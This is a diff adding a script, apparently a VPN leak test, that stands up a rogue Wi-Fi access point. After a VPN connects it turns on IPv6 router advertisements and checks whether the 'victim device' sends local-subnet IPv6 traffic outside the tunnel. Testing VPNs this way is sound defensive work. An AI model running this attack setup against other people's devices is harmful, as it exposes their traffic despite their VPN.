@@ -1,0 +1,84 @@
+(*
+ * IPv4->IPv6
+ * This state machine initially brings up an IPv4-only network.
+ * Then, after a client establishes a VPN connection, IPv6 becomes enabled.
+ * The target address that is to be flowing outside the tunnel is strictly IPv6.
+ * The network is set up such that the target address resides within the local subnet (i.e. the localnet scenario).
+ * This test evaluates whether IPv6 traffic is sent directly in case IPv6 is enabled
+ * and an IPv6 subnet is introduced after a VPN connection is already established.
+ *)
+
+state init begin:
+  miscnet = miscnet();
+  my_ip_v4 = "192.168.137.1";
+  netmask_v4 = "255.255.255.0";
+  (* perform nat on the interface where our default gateway is at *)
+  miscnet.masquerade("true");
+  prefix_len_v6 = "64";
+  (* we want target_ip_v6 to flow outside of the tunnel *)
+  target_ip_v6 = miscnet.lookup_ipv6("v6.phphooligans.nl");
+  (* select an ip within the same subnet but not equal to target_ip_v6 *)
+  my_ip_v6 = miscnet.subnet_ipv6(target_ip_v6, prefix_len_v6);
+
+  ap = accesspoint();
+  ap.wifi_interface = "wlan0";
+  ap.ipv4_addr = my_ip_v4;
+  ap.ipv4_netmask = netmask_v4;
+  ap.dhcp4_enable = "true";
+  ap.dhcp4_dns = my_ip_v4;
+  ap.dhcp4_router = my_ip_v4;
+  (* route all the traffic within target_ip/24 to our default gateway *)
+  ap.route_to_default = "true";
+  (* ap.dhcp4_leasetime = "15"; *)
+  ap.dns_enable = "true";
+  ap.dns_set_override("v6.phphooligans.nl", target_ip_v6);
+
+  ap.ipv6_addr = my_ip_v6;
+  ap.ipv6_prefixlen = prefix_len_v6;
+  (* slaac is enabled after vpn connection is detected *)
+  ap.slaac_enable = "false";
+  (* ap.slaac_dns = "2001:4860:4860::8888"; *)
+  ap.slaac_dns = my_ip_v6;
+  (* enable 6->4 network address translation *)
+  ap.nat64_enable = "true";
+  ap.bring_up(ap_up, ap_err);
+
+state ap_err:
+  exit("failed to bring up access point: ", errstr);
+
+state ap_up:
+  mon = trafficmonitor();
+  mon.interface = ap.ap_interface;
+  (* specify vpn endpoints so that the monitor can detect whether vpn traffic occurs *)
+  endpoints = "tcp://ams.nl.eduvpn.org:443;udp://ams.nl.eduvpn.org:443";
+  endpoints = concat(endpoints, ";udp://ifi2-vpn.guest.eduvpn.no:1194");
+  endpoints = concat(endpoints, ";udp://tekno-vpn.guest.eduvpn.no:1194");
+  endpoints = concat(endpoints, ";udp://eduvpnga.ethernet.edu.et:1194");
+  endpoints = concat(endpoints, ";udp://eduvpn.ac.lk:1194");
+  endpoints = concat(endpoints, ";udp://eduvpn.renu.ac.ug:1194");
+  mon.vpn_endpoints = endpoints;
+  (* allow 5 seconds for the client to complete the handshake counting from the first packet *)
+  mon.detect_vpn(vpn_detected, mon_err, "5000");
+  print("[i] Please connect to the vpn on the victim device");
+
+state mon_err:
+  exit("Error occurred: ", errstr);
+
+state vpn_detected:
+  print("[+] detected a vpn connection -> proceding");
+  ap.slaac_enable = "true";
+  ap.slaac_reload();
+  ap.slaac_renew(slaac_renew);
+  (* ap.dhcp4_enable = "false"; *)
+  (* ap.dhcp4_reload(); *)
+  print("[i] Sending Router Advertisement...");
+
+state slaac_renew:
+  mon.validation_server = "https://v6.phphooligans.nl:8443/";
+  mon.detect_attack(vpn_safe, vpn_vuln, mon_err);
+
+state vpn_safe:
+  exit("Your vpn appears to be safe, congratulations!");
+
+state vpn_vuln:
+  exit("Your vpn appears to be vulnerable!");
